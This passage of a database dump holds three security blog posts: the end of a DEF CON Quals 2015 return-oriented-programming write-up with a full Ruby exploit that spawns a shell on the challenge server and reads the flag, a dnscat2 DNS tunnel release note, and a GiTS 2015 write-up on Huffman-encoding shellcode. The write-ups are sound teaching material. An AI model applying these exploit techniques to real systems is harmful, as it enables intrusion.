challenge...\r\n[...]\r\nMenu:\r\nSegmentation fault (core dumped)\r\n\nGreat! It crashed as expected! Let\'s take a look at HOW it crashed:\n\r\n$ gdb -q ./r0pbaby ./core\r\nCore was generated by `./r0pbaby\'.\r\nProgram terminated with signal SIGSEGV, Segmentation fault.\r\n#0  0x00007ffff792b2cb in clone () from /lib64/libc.so.6\r\n(gdb) x/i $rip\r\n=> 0x7ffff792b2cb :  call   rax\r\n\nIt crashed on the call at the end of the gadget, which makes sense! Let\'s check out what it\'s trying to call and what it\'s using as a parameter:\n\r\n(gdb) print/x $rax\r\n$1 = 0x4343434343434343\r\n(gdb) print/x $rdi\r\n$2 = 0x4444444444444444\r\n\nIt\'s trying to call \"CCCCCCCC\" with the parameter \"DDDDDDDD\". Awesome! Let\'s try it again, but this time we\'ll plug in our sh_address in place of \"DDDDDDDD\" to make sure that\'s working (I strongly believe in incremental testing :) ):\n\r\n$ echo -ne \'3\\n32\\nAAAAAAAA\\xc9\\xb2\\x92\\xf7\\xff\\x7f\\x00\\x00CCCCCCCC\\x7c\\x30\\x9a\\xf7\\xff\\x7f\\x00\\x00\\n\' | ./r0pbaby\r\n[...]\r\nSegmentation fault (core dumped)\r\n$ gdb -q ./r0pbaby ./core\r\n[...]\r\n(gdb) x/i $rip\r\n=> 0x7ffff792b2cb :  call   rax\r\n\nIt\'s still crashing in the same place! We don\'t have to check rax, we know it\'ll be 0x4343434343434343 (\"CCCCCCCC\") again. But let\'s check out if rdi is right:\n\r\n(gdb) print/x $rdi\r\n$2 = 0x7ffff79a307c\r\n(gdb) x/s $rdi\r\n0x7ffff79a307c: \"/bin/sh\"\r\n\nAll right, the parameter is set properly!\nOne last step: Replace the return address (\"CCCCCCCC\") with the address of system 0x00007ffff7883960:\n\r\n$ echo -ne \'3\\n32\\nAAAAAAAA\\xc9\\xb2\\x92\\xf7\\xff\\x7f\\x00\\x00\\x60\\x39\\x88\\xf7\\xff\\x7f\\x00\\x00\\x7c\\x30\\x9a\\xf7\\xff\\x7f\\x00\\x00\\n\' | ./r0pbaby\r\n\nUnfortunately, you can\'t return into system(). I couldn\'t figure out why, but on Twitter Jan Kadijk said that it\'s likely because system() ends when it sees the end of file (EOF) marker, which makes perfect sense.\nSo in the interest of proving that this actually returns to a function, we\'ll call printf (0x00007FFFF7892F10) instead:\n\r\n$ echo -ne \'3\\n32\\nAAAAAAAA\\xc9\\xb2\\x92\\xf7\\xff\\x7f\\x00\\x00\\x10\\x2f\\x89\\xf7\\xff\\x7f\\x00\\x00\\x7c\\x30\\x9a\\xf7\\xff\\x7f\\x00\\x00\\n\' | ./r0pbaby\r\n\r\nWelcome to an easy Return Oriented Programming challenge...\r\nMenu:\r\n1) Get libc address\r\n2) Get address of a libc function\r\n3) Nom nom r0p buffer to stack\r\n4) Exit\r\n: Enter bytes to send (max 1024): 1) Get libc address\r\n2) Get address of a libc function\r\n3) Nom nom r0p buffer to stack\r\n4) Exit\r\n: Bad choice.\r\n/bin/sh\r\n\nIt prints out its first parameter - \"/bin/sh\" - proving that printf() was called and therefore the return chain works!\nThe exploit\nHere\'s the full exploit in Ruby. If you want to run this against your own system, you\'ll have to calculate the offset of the \"/bin/sh\" string and the handy-dandy gadget first! Just find them in IDA or objdump or whatever and subtract the address of system() from them.\n\r\n#!/usr/bin/ruby\r\n\r\nrequire \'socket\'\r\n\r\nSH_OFFSET_REAL = 0x13669b\r\nSH_OFFSET_MINE = 0x11f71c\r\n\r\nGADGET_OFFSET_REAL = 0xb3e39\r\nGADGET_OFFSET_MINE = 0xa7969\r\n\r\n#HOST = \"localhost\"\r\nHOST = \"r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me\"\r\n\r\nPORT = 10436\r\n\r\ns = TCPSocket.new(HOST, PORT)\r\n\r\n# Receive until the string matches the regex, then delete everything\r\n# up to the regex\r\ndef recv_until(s, regex)\r\n  buffer = \"\"\r\n\r\n  loop do\r\n    buffer += s.recv(1024)\r\n    if(buffer =~ /#{regex}/m)\r\n      return buffer.gsub(/.*#{regex}/m, \'\')\r\n    end\r\n  end\r\nend\r\n\r\n# Get the address of \"system\"\r\nputs(\"Getting the address of system()...\")\r\ns.write(\"2\\n\")\r\ns.write(\"system\\n\")\r\nsystem_addr = recv_until(s, \"Symbol system: \").to_i(16)\r\nputs(\"system() is at 0x%08x\" % system_addr)\r\n\r\n# Build the ROP chain\r\nputs(\"Building the ROP chain...\")\r\npayload = \"AAAAAAAA\" +\r\n  [system_addr + GADGET_OFFSET_REAL].pack(\"<Q\") + # address of the gadget\r\n  [system_addr].pack(\"<Q\") +                      # address of system\r\n  [system_addr + SH_OFFSET_REAL].pack(\"<Q\") +     # address of \"/bin/sh\"\r\n  \"\"\r\n\r\n# Write the ROP chain\r\nputs(\"Sending the ROP chain...\")\r\ns.write(\"3\\n\")\r\ns.write(\"#{payload.length}\\n\")\r\ns.write(payload)\r\n\r\n# Tell the program to exit\r\nputs(\"Exiting the program...\")\r\ns.write(\"4\\n\")\r\n\r\n# Give sh some time to start\r\nputs(\"Pausing...\")\r\nsleep(1)\r\n\r\n# Write the command we want to run\r\nputs(\"Attempting to read the flag!\")\r\ns.write(\"cat /home/r0pbaby/flag\\n\")\r\n\r\n# Receive forever\r\nloop do\r\n  x = s.recv(1024)\r\n\r\n  if(x.nil? || x == \"\")\r\n    puts(\"Done!\")\r\n    exit\r\n  end\r\n  puts(x)\r\nend\r\n\n\n[update] Or... do it the easy way\nAfter I posted this, I got a tweet from @gaasedelen informing me that libc has a \"magic\" address that will literally call exec() with \"/bin/sh\", making much of this unnecessary for this particular level. You can find it by seeing where the \"/bin/sh\" string is referenced. You can return to that address and a shell pops.\nBut it\'s still a good idea to know how to construct a ROP chain, even if it\'s not strictly necessary. :)\nConclusion\nAnd that\'s how to perform a ROP attack against a 64-bit binary! I\'d love to hear feedback!', '\'Defcon Quals 2015\'', 'https://blog.skullsecurity.org/2015/defcon-quals-r0pbaby-simple-64-bit-rop');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (14, 'dnscat2 beta release!', 'Ron Bowes', '2015-3-26', 'As I promised during my 2014 Derbycon talk (amongst other places), this is an initial release of my complete re-write/re-design of the dnscat service / protocol. It\'s now a standalone tool instead of being bundled with nbtool, among other changes. :)\nI\'d love to have people testing it, and getting feedback is super important to me! Even if you don\'t try this version, hearing that you\'re excited for a full release would be awesome. The more people excited for this, the more I\'m encouraged to work on it! In case you don\'t know it, my email address is listed below in a couple places.\n\nWhere can I get it?\nHere are some links:\n Sourcecode on github (HEAD sourcecode)\n Downloads (you\'ll find signed Linux 32-bit, Linux 64-bit, Win32, and source code versions of the client, plus an archive of the server—keep in mind that that signature file is hosted on the same server as the files, so if you\'re worried, please verify :) )\n User documentation\n Protocol and command protocol documents (as a user, you probably don\'t need these)\n Issue tracker (you can also email me issues, just put my first name (ron) in front of my domain name (skullsecurity.net))\nWait, what happened to dnscat1?\nI designed dnscat1 to be similar to netcat; the client and server were the same program, and you could tunnel both ways. That quickly became complex and buggy and annoying to fix. It\'s had unresolved bugs for years! I\'ve been promising a major upgrade for years, but I wanted it to be reasonably stable/usable before I released anything!\nSince generic TCP/IP DNS tunnels have been done (for example, by iodine), I decided to make dnscat2 a little different. I target penetration testers as users, and made the server more of a command & control-style service. For example, an old, old version of dnscat2 had the ability to proxy data through the client and out the server. I decided to remove that code because I want the server to be runnable on a trusted network.\nAdditionally, unlike dnscat1, dnscat2 uses a separate client and server. The client is still low-level portable C code that should run anywhere (tested on 32- and 64-bit Linux, Windows, FreeBSD, and OS X). The server is now higher-level Ruby code that requires Ruby and a few libraries (I regularly use it on Linux and Windows, but it should run anywhere that Ruby and the required gems runs). That means I can quickly and easily add functionality to the server while implementing relatively simple clients.\nHow can I help?\nThe goal of this release is primarily to find bugs in compilation, usage, and documentation. Everything should work on all 32- and 64-bit versions of Linux, Windows, FreeBSD, and OS X. If you get it working on any other systems, let me know so I can advertise it!\nI\'d love to hear from anybody who successfully or unsuccessfully tried to get things going. Anything from what you liked, what you didn\'t like, what was intuitive, what was unintuitive, where the documentation was awesome, where the documentation sucked, what you like about my face, what you hate about my face—anything at all! Seriously, if you get it working, email me—knowing that people are using it is awesome and motivates me to do more. :)\nFor feedback, my email address is my first name (ron) at my domain (skullsecurity.net). If you find any bugs or have any feature requests, the best place to go is my Issue tracker.\nWhat\'s the future hold?\nI\'ve spent a lot of time on stability and bugfixes recently, which means I haven\'t been adding features. The two major features that I plan to add are:\n\nTCP proxying - basically, creating a tunnel that exits through the client\nShellcode - a x86/x64 implementation of dnscat for Linux and/or Windows\n\nOnce again, I\'d love feedback on which you think is more important, and if you\'re excited to get shellcode, then which architecture/OS that I should prioritize. :)', '\'DNS\', \'Tools\'', 'https://blog.skullsecurity.org/2015/dnscat2-beta-release');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (15, 'GitS 2015: Huffy (huffman-encoded shellcode)', 'Ron Bowes', '2015-2-4', 'Welcome to my fourth and final writeup from Ghost in the Shellcode 2015! This one is about the one and only reversing level, called \"huffy\", that was released right near the end.\nUnfortunately, while I thought I was solving it a half hour before the game ended, I had messed up some timezones and was finishing it a half hour after the game ended. So I didn\'t do the final exploitation step.\nAt any rate, I solved the hard part, so I\'ll go over the solution!\n\nHuffman Trees\nSince the level was called \"huffy\", and I recently solved a level involving Huffman Trees in the Defcon qualifiers, my immediate thought was a Huffman Tree.\nFor those who don\'t know, a Huffman Tree is a fairly simple data structure used for data compression. The tree is constructed by reading the input and building a tree where the most common characters are near the top, and the least common are near the bottom.\nTo compress data, it traverses the tree to generate the encoded bits (left = 0, right = 1). The closer to the top something is, the less bits it encodes to. It\'s also a \"prefix code\", which is a really neat property that means that no encoded bit string is a prefix of another one (in other words, when you\'re reading bits, you instantly know when you\'re done decoding one character).\nFor example, if you had a Huffman Tree that looked like:\n\r\n       9\r\n    /     \\\r\n   4       5 (o)\r\n /   \\\r\nd(3)  g(1)\r\n\nYou know that it was generated from text with 9 characters. 5 of the characters were \'o\', 3 of the characters were \'d\', and 1 of the characters were \'g\'.\nWhen you use it to compress data, you might compress \"dog\" like:\n\nd = 00 (left left)\no = 1 (right)\ng = 01 (left right)\n\nTherefore, \"dog\" would encode to the bits \"00101\".\nIf you saw the string of bits \"01100\", you could follow the tree: left right (g) right (o) left left (d) and get the string \"god\".\nIf there are equal numbers of each character in a string, and the number of unique characters is a power of 2, you wind up with a balanced tree.. for example, the string \"aaabbbcccddd\" would have the huffman tree:\n\r\n       12\r\n    /      \\\r\n   6        6\r\n /   \\    /   \\\r\na     b  c     d\r\n\nAnd the string \"abcd\" will be encoded \"00011011\".\nThat property is going to be important. :)\nUnderstanding the program\nWhen you run the program it prompts for input from stdin. If you give it input, it outputs a whole bunch of junk (although the output makes it a whole lot easier!).\nHere\'s an example:\n\r\n$ echo \'this is a test string\' | ./huffy\r\nCWD: /home/ron/gits2015/huffy\r\nNibble  Frequency\r\n------  ---------\r\n0       0.113636\r\n1       0.022727\r\n2       0.113636\r\n3       0.090909\r\n4       0.090909\r\n5       0.022727\r\n6       0.181818\r\n7       0.227273\r\n8       0.022727\r\n9       0.068182\r\na       0.022727\r\nb       0.000000\r\nc       0.000000\r\nd       0.000000\r\ne       0.022727\r\nf       0.000000\r\n\r\nRead 22 bytes\r\nTwo lowest frequencies: 0.000000 and 0.000000\r\nTwo lowest frequencies: 0.000000 and 0.000000\r\nTwo lowest frequencies: 0.000000 and 0.000000\r\nTwo lowest frequencies: 0.000000 and 0.022727\r\nTwo lowest frequencies: 0.022727 and 0.022727\r\nTwo lowest frequencies: 0.022727 and 0.022727\r\nTwo lowest frequencies: 0.022727 and 0.045455\r\nTwo lowest frequencies: 0.045455 and 0.068182\r\nTwo lowest frequencies: 0.068182 and 0.090909\r\nTwo lowest frequencies: 0.090909 and 0.113636\r\nTwo lowest frequencies: 0.113636 and 0.113636\r\nTwo lowest frequencies: 0.159091 and 0.181818\r\nTwo lowest frequencies: 0.204545 and 0.227273\r\nTwo lowest frequencies: 0.227273 and 0.227273\r\nTwo lowest frequencies: 0.340909 and 0.431818\r\nTwo lowest frequencies: 0.454545 and 0.454545\r\nTwo lowest frequencies: 0.772727 and 0.909091\r\nBreaking!\r\n0 --0--> 0x9863348 --1--> 0x9863390 --1--> 0x98633c0 --1--> 0x98633d8\r\n1 --0--> 0x98632b8 --1--> 0x98632e8 --0--> 0x9863318 --0--> 0x9863360 --0--> 0x98633a8 --0--> 0x98633d8\r\n2 --1--> 0x9863348 --1--> 0x9863390 --1--> 0x98633c0 --1--> 0x98633d8\r\n3 --1--> 0x9863318 --0--> 0x9863360 --0--> 0x98633a8 --0--> 0x98633d8\r\n4 --0--> 0x9863330 --0--> 0x9863378 --1--> 0x98633a8 --0--> 0x98633d8\r\n5 --0--> 0x98632d0 --0--> 0x9863300 --1--> 0x9863330 --0--> 0x9863378 --1--> 0x98633a8 --0--> 0x98633d8\r\n6 --1--> 0x9863360 --0--> 0x98633a8 --0--> 0x98633d8\r\n7 --1--> 0x9863378 --1--> 0x98633a8 --0--> 0x98633d8\r\n8 --0--> 0x98632e8 --0--> 0x9863318 --0--> 0x9863360 --0--> 0x98633a8 --0--> 0x98633d8\r\n9 --1--> 0x9863300 --1--> 0x9863330 --0--> 0x9863378 --1--> 0x98633a8 --0--> 0x98633d8\r\na --1--> 0x98632d0 --0--> 0x9863300 --1--> 0x9863330 --0--> 0x9863378 --1--> 0x98633a8 --0--> 0x98633d8\r\nb --0--> 0x9863258 --0--> 0x9863270 --0--> 0x9863288 --0--> 0x98632a0 --1--> 0x98632b8 --1--> 0x98632e8 --0--> 0x9863318 --0--> 0x9863360 --0--> 0x98633a8 --0--> 0x98633d8\r\nc --1--> 0x9863288 --0--> 0x98632a0 --1--> 0x98632b8 --1--> 0x98632e8 --0--> 0x9863318 --0--> 0x9863360 --0--> 0x98633a8 --0--> 0x98633d8\r\nd --1--> 0x9863270 --0--> 0x9863288 --0--> 0x98632a0 --1--> 0x98632b8 --1--> 0x98632e8 --0--> 0x9863318 --0--> 0x9863360 --0--> 0x98633a8 --0--> 0x98633d8\r\ne --1--> 0x98632a0 --1--> 0x98632b8 --1--> 0x98632e8 --0--> 0x9863318 --0--> 0x9863360 --0--> 0x98633a8 --0--> 0x98633d8\r\nf --1--> 0x9863258 --0--> 0x9863270 --0--> 0x9863288 --0--> 0x98632a0 --1--> 0x98632b8 --1--> 0x98632e8 --0--> 0x9863318 --0--> 0x9863360 --0--> 0x98633a8 --0--> 0x98633d8\r\nEncoding input...\r\nASCII Encoded: 011010000100000001010110110001111111100010101101100011111111000100001011111110011010000101010001100010110100111111100110001011010001111110010101100100001110010111110010101\r\nBinary Encoded:\r\nh@V????Q?O?-????\r\nExecuting encoded input...\r\nSegmentation fault\r\n\nIt took me a little bit of time to see what\'s going on, but once you get it, it\'s pretty straight forward!\nThe first part is giving a frequency analysis of each nibble (a nibble being one hex character, or half of a byte). That tells me that it\'s compressing it via nibbles. Then it gives a frequency analysis of the input—I didn\'t worry too much about that—then it shows the encodings for each of the 16 possible nibbles.\nAfter it encodes them, it takes those bits and converts them to a long binary string, then tries to run it.\nSo to summarize: you have to come up with some data that, when compressed nibble-by-nibble with Huffman encoding, will turn into something executable!\nCleaning up the output\nTo make my life easier, I thought I\'d use a bit of shell-fu to clean up the output so I can better understand what\'s going on:\n\r\n$ echo \'this is a test string\' | ./huffy | sed -re \'s/ --/ /\' -e \'s/--> .{9} --//g\' -e \'s/--> .*//\'\r\n\nWhich produces the output:\n\r\n[...]\r\n0 0111\r\n1 010000\r\n2 1111\r\n3 1000\r\n4 0010\r\n5 001010\r\n6 100\r\n7 110\r\n8 00000\r\n9 11010\r\na 101010\r\nb 0000110000\r\nc 10110000\r\nd 100110000\r\ne 1110000\r\nf 1000110000\r\nEncoding input...\r\nASCII Encoded: 011010000100000001010110110001111111100010101101100011111111000100001011111110011010000101010001100010110100111111100110001011010001111110010101100100001110010111110010101\r\n\nIf you try to give it \"AAAA\", you wind up with this table:\n\r\n$ echo \'AAAA\' | ./huffy | sed -re \'s/ --/ /\' -e \'s/--> .{9} --//g\' -e \'s/--> .*//\'\r\n[...]\r\n0 0101\r\n1 0\r\n2 0000000000001101\r\n3 101101\r\n4 11\r\n5 1001101\r\n6 10001101\r\n7 100001101\r\n8 1000001101\r\n9 10000001101\r\na 11101\r\nb 100000001101\r\nc 1000000001101\r\nd 10000000001101\r\ne 100000000001101\r\nf 1000000000001101\r\nEncoding input...\r\nASCII Encoded: 110110110110101010111\r\nBinary Encoded:\r\n\nYou probably know that AAAA = \"41414141\", so \'4\' and \'1\' are the most common nibbles. That\'s borne out in the table, too, with \'4\' being encoded as \'11\' and \'1\' being encoded as \'0\'. We also expect to see a newline at the end - \"\\x0a\" - so the \'0\' and \'a\' should also be encoded there.\nIf we break apart the characters, we see this string:\n\r\nASCII Encoded: 11 0 11 0 11 0 11 0 1010 10111\r\n\nOne thing to note is that everything is going to be backwards from how you see it on the table! 11 and 0 don\'t actually matter, but 1010 = 0101 = \'0\', and 10111 = 11101 = \'a\'. I honestly didn\'t notice that during the actual game, though, I worked around that problem in a creative way. :)\nBalancing it out\nRemember I mentioned earlier that if you have a balanced tree with a power-of-two number of nodes, all characters are encoded to the same number of bits? Well, it turns out that there are 16 different nibbles, so if you have an even number of each nibble in your input string, they each encode to 4 bits:\n\r\n$ echo -ne \'\\x01\\x23\\x45\\x67\\x89\\xab\\xcd\\xef\' | ./huffy | sed -re \'s/ --/ /\' -e \'s/--> .{9} --//g\' -e \'s/--> .*//\'\r\n0 0000\r\n1 0001\r\n2 0011\r\n3 0010\r\n4 0110\r\n5 0111\r\n6 0101\r\n7 0100\r\n8 1100\r\n9 1101\r\na 1111\r\nb 1110\r\nc 1010\r\nd 1011\r\ne 1001\r\nf 1000\r\n\nAnd not only do they each encode to 4 bits, every possible 4-bit value is there, too!\nExploit\nThe exploit now is just a matter of...\n\nFiguring out which nibbles encode to which bits\nWriting those nibbles out as shellcode\nPadding the shellcode till you have the same number of each nibble\n\nThat\'s all pretty straight forward! Check out my full exploit, or piece it together from the snippits below :)\nFirst, create a table (I did this by hand):\n\r\n@@table = {\r\n  \"0000\" => 0x0, \"0001\" => 0x1, \"0011\" => 0x2, \"0010\" => 0x3,\r\n  \"0110\" => 0x4, \"0111\" => 0x5, \"0101\" => 0x6, \"0100\" => 0x7,\r\n  \"1100\" => 0x8, \"1101\" => 0x9, \"1111\" => 0xa, \"1110\" => 0xb,\r\n  \"1010\" => 0xc, \"1011\" => 0xd, \"1001\" => 0xe, \"1000\" => 0xf,\r\n}\r\n\nThen encode the shellcode:\n\r\ndef encode_nibble(b)\r\n  binary = b.to_s(2).rjust(4, \'0\')\r\n  puts(\"Looking up %s... => %x\" % [binary, @@table[binary]])\r\n  return @@table[binary]\r\nend\r\n\r\n@@hist = [ 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, ]\r\n\r\n#shellcode = \"\\xeb\\xfe\"\r\n#shellcode = \"\\xcd\\x03\"\r\nshellcode = \"hello world, this is my shellcode!\"\r\nshellcode.each_byte do |b|\r\n  n1 = b >> 4\r\n  n2 = b & 0x0f\r\n\r\n  puts(\"n1 = %x\" % n1)\r\n  puts(\"n2 = %x\" % n2)\r\n\r\n  @@hist[n1] += 1\r\n  @@hist[n2] += 1\r\n\r\n  out += ((encode_nibble(n1) << 4) | (encode_nibble(n2) & 0x0F)).chr\r\nend\r\n\nNotice that I maintain a histogram, that makes the final step easier, padding the string as needed:\n\r\ndef get_padding()\r\n  result = \"\"\r\n  max = @@hist.max\r\n\r\n  needed_nibbles = []\r\n  0.upto(@@hist.length - 1) do |i|\r\n    needed_nibbles << [i] * (max - @@hist[i])\r\n    needed_nibbles.flatten!\r\n  end\r\n\r\n  if((needed_nibbles.length % 2) != 0)\r\n    puts(\"We need an odd number of nibbles! Add some NOPs or something :(\")\r\n    exit\r\n  end\r\n\r\n  0.step(needed_nibbles.length - 1, 2) do |i|\r\n    n1 = needed_nibbles[i]\r\n    n2 = needed_nibbles[i+1]\r\n\r\n    result += ((encode_nibble(n1) << 4) | (encode_nibble(n2) & 0x0f)).chr\r\n  end\r\n\r\n  return result\r\nend\r\n\nAnd now \"out\" should contain a bunch of nibbles that will map to shellcode! Should!\nFinally, we output it:\n\r\ndef output(str)\r\n  print \"echo -ne \'\"\r\n  str.bytes.each do |b|\r\n    print(\"\\\\x%02x\" % b)\r\n  end\r\n  puts(\"\' > in; ./huffy < in\")\r\nend\r\n\nHacking around a bug\nDid you notice what I did wrong? I made a big mistake, and in the heat of the contest I didn\'t have time to fix it properly. When I tried to encode \"hello world, this is my shellcode!\", I get:\n\r\necho -ne \'\\x4f\\x46\\x48\\x48\\x4a\\x30\\x55\\x4a\\x53\\x48\\x47\\x38\\x30\\x57\\x4f\\x4e\\x52\\x30\\x4e\\x52\\x30\\x49\\x5e\\x30\\x52\\x4f\\x46\\x48\\x48\\x42\\x4a\\x47\\x46\\x31\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x33\\x33\\x33\\x33\\x33\\x33\\x22\\x22\\x22\\x22\\x22\\x22\\x22\\x22\\x77\\x77\\x77\\x77\\x77\\x77\\x77\\x77\\x76\\x66\\x66\\x66\\x66\\x66\\x66\\x66\\x66\\x55\\x55\\x55\\x55\\x55\\x55\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xfe\\xee\\xee\\xee\\xee\\xee\\xee\\xee\\xee\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xdd\\xdd\\xdd\\xdd\\xdd\\xdd\\xdd\\xdd\\xdd\\xdd\\x88\\x88\\x88\\x88\\x88\\x88\\x88\\x99\\x99\\x99\\x99\\x99\\x99\\x99\\x99\\x99\\x9b\\xbb\\xbb\\xbb\\xbb\\xbb\\xbb\\xbb\\xbb\\xbb\\xba\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\' > in; ./huffy < in\r\n\nWhich works out to:\n\r\najcco@?o?cbC@?ai?@i?@k?@?ajcclobj?????????DDDDDD????????\"\"\"\"\"\"\"\"*??????????????????????UUUUUUUUUU??????????3333333??????????wwwwwwwww????????\r\n\nThat\'s not my string! What\'s the deal?\nBut notice the string starts with \"ajcco\" - that kidna looks like \"hello\". And the 4-bits-per-character thing is holding up, we can see:\n\r\n0 0000\r\n1 0001\r\n2 0011\r\n3 0010\r\n4 0110\r\n5 0111\r\n6 0101\r\n7 0100\r\n8 1100\r\n9 1101\r\na 1111\r\nb 1110\r\nc 1010\r\nd 1011\r\ne 1001\r\nf 1000\r\n\nSo it\'s kinda working! Kinnnnnda!\nTo work on this, I tried the shellcode\n\"\\x01\\x23\\x45\\x67\\x89\\xab\\xcd\\xef\"\nand determined that it encoded to: \"0000100001001100001010100110111000011001010111010011101101111111\", which is, in hex:\n\"\\x08\\x4c\\x3a\\x6e\\x19\\x5d\\x3b\\x7f\"\nOr, to list the nibbles:\n\r\n0000\r\n1000\r\n0100\r\n1100\r\n0010\r\n1010\r\n0110\r\n1110\r\n0001\r\n1001\r\n0101\r\n1101\r\n0011\r\n1011\r\n0111\r\n1111\r\n\nIf I was paying more attention, I would have noticed the obvious problem: they\'re backwards!!!\nIn my rush to get the level done, I didn\'t notice that every nibble\'s bits were exactly backwards (1000 instead of 0001, 0100 instead of 0010, etc etc)\nWhile I didn\'t notice the problem, I did notice that everything was consistently wrong. So I did this:\n\r\nhack_table = {\r\n  0x02 => 0x08, 0x0d => 0x09, 0x00 => 0x00, 0x08 => 0x02,\r\n  0x0f => 0x01, 0x07 => 0x03, 0x03 => 0x07, 0x0c => 0x06,\r\n  0x04 => 0x04, 0x0b => 0x05, 0x01 => 0x0f, 0x0e => 0x0e,\r\n  0x06 => 0x0c, 0x09 => 0x0d, 0x05 => 0x0b, 0x0a => 0x0a\r\n}\r\n\r\nhack_out = \"\"\r\n\r\nout.bytes.each do |b|\r\n  n1 = hack_table[b >> 4]\r\n  n2 = hack_table[b & 0x0f]\r\n\r\n  hack_out += ((n1 << 4) | (n2 & 0x000f)).chr\r\nend\r\noutput(hack_out)\r\n\nAnd ran it with the original test shellcode:\n\r\n$ ruby ./sploit.rb\r\necho -ne \'\\x41\\x4c\\x42\\x42\\x4a\\x70\\xbb\\x4a\\xb7\\x42\\x43\\x72\\x70\\xb3\\x41\\x4e\\xb8\\x70\\x4e\\xb8\\x70\\x4d\\xbe\\x70\\xb8\\x41\\x4c\\x42\\x42\\x48\\x4a\\x43\\x4c\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0f\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x77\\x77\\x77\\x77\\x77\\x77\\x88\\x88\\x88\\x88\\x88\\x88\\x88\\x88\\x33\\x33\\x33\\x33\\x33\\x33\\x33\\x33\\x3c\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xbb\\xbb\\xbb\\xbb\\xbb\\xbb\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x1e\\xee\\xee\\xee\\xee\\xee\\xee\\xee\\xee\\x66\\x66\\x66\\x66\\x66\\x66\\x66\\x66\\x66\\x66\\x99\\x99\\x99\\x99\\x99\\x99\\x99\\x99\\x99\\x99\\x22\\x22\\x22\\x22\\x22\\x22\\x22\\xdd\\xdd\\xdd\\xdd\\xdd\\xdd\\xdd\\xdd\\xdd\\xd5\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x5a\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\' > in; ./huffy < in\r\n\nThen run the code I got:\n\r\n$ echo -ne \'\\x41\\x4c\\x42\\x42\\x4a\\x70\\xbb\\x4a\\xb7\\x42\\x43\\x72\\x70\\xb3\\x41\\x4e\\xb8\\x70\\x4e\\xb8\\x70\\x4d\\xbe\\x70\\xb8\\x41\\x4c\\x42\\x42\\x48\\x4a\\x43\\x4c\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0f\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x77\\x77\\x77\\x77\\x77\\x77\\x88\\x88\\x88\\x88\\x88\\x88\\x88\\x88\\x33\\x33\\x33\\x33\\x33\\x33\\x33\\x33\\x3c\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xbb\\xbb\\xbb\\xbb\\xbb\\xbb\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x1e\\xee\\xee\\xee\\xee\\xee\\xee\\xee\\xee\\x66\\x66\\x66\\x66\\x66\\x66\\x66\\x66\\x66\\x66\\x99\\x99\\x99\\x99\\x99\\x99\\x99\\x99\\x99\\x99\\x22\\x22\\x22\\x22\\x22\\x22\\x22\\xdd\\xdd\\xdd\\xdd\\xdd\\xdd\\xdd\\xdd\\xdd\\xd5\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x5a\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\' > in; ./huffy < in\r\n\nBinary Encoded:\n\r\nhello world, this is my shellcode!\"\"\"\"\"\"33333333DDDDDDDDEUUUUUUUUwwwwww????????????????????????????????????????????????????????????????????????\r\nExecuting encoded input...\r\nSegmentation fault\r\n\nThat\'s better! It decoded it properly thanks to my little hack! Not let\'s try my two favourite test strings, \"\\xcd\\x03\" (debug breakpoint, can also use \"\\xcc\") and \"\\xeb\\xfe\" (infinite loop):\n\r\n$ ruby ./sploit.rb\r\necho -ne \'\\x2d\\x08\\xf7\\x3c\\x4b\\x1e\\x69\\x5a\' > in; ./huffy < in\r\n\r\n$ echo -ne \'\\x2d\\x08\\xf7\\x3c\\x4b\\x1e\\x69\\x5a\' > in; ./huffy < in\r\nBinary Encoded:\r\n?Eg???\r\nExecuting encoded input...\r\nTrace/breakpoint trap\r\n\r\n$ ruby ./sploit.rb\r\necho -ne \'\\x59\\xa5\\x00\\xff\\x77\\x88\\x33\\xcc\\x44\\xbb\\x11\\xee\\x66\\x92\\x2d\\xda\' > in; ./huffy < in\r\n\r\n$ echo -ne \'\\x59\\xa5\\x00\\xff\\x77\\x88\\x33\\xcc\\x44\\xbb\\x11\\xee\\x66\\x92\\x2d\\xda\' > in; ./huffy < in\r\nBinary Encoded:\r\n??\"3DUfw??????\r\nExecuting encoded input...\r\n[...infinite loop...]\r\n\nAt this point, I had run out of time (damn you timezones!) and didn\'t finish up.\nSummary\nThis was, as I mentioned, a pretty straight forward Huffman-Tree level.\nIt compresses your input, nibble-by-nibble, and runs the result.\nI gave it some input to ensure the tree is balanced, where each nibble produces 4 bits, then we encoded the shellcode as such.\nWhen I realized I was getting the wrong output, rather than reversing the bit strings, which I hadn\'t realize were backwards until just now, I made a little table to translate them correctly.\nThen we encode the shellcode, and we win!\nThe last step would be to find appropriate shellcode, pad the message to always be 1024 nibbles (like the server wants), and send it off!', '\'GITS2015\', \'Reverse Engineering\'', 'https://blog.skullsecurity.org/2015/gits-2015-huffy-huffman-encoded-shellcode');
